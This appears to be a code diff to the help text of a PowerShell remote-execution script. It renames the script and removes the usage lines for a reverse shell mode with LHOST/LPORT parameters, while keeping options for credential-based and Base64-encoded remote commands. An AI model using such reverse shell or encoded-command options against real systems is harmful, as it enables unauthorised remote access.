@@ -24,19 +24,14 @@ function Show-Help {
     Write-Host
 @"
 Regular Command:
-    .\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Command <command>
+    .\Run-As-Clean.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Command <command>
     or
-    .\Run-As.ps1 -u <username> -p <password> -cn <computer name> -c <command>
+    .\Run-As-Clean.ps1 -u <username> -p <password> -cn <computer name> -c <command>
 
 Base64 Command:
-    .\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Base64 -Command <command>
+    .\Run-As-Clean.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Base64 -Command <command>
     or
-    .\Run-As.ps1 -u <username> -p <password> -cn <computer name> -b -c <command>
-
-Reverse Shell (using built-in PowerShell commands)
-    .\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -RevShell -LHOST <local ip> -LPORT <local port>
-    or
-    .\Run-As.ps1 -u <username> -p <password> -cn <computer name> -rs -lh <local ip> -lp <local port>
+    .\Run-As-Clean.ps1 -u <username> -p <password> -cn <computer name> -b -c <command>
 "@
 }
 
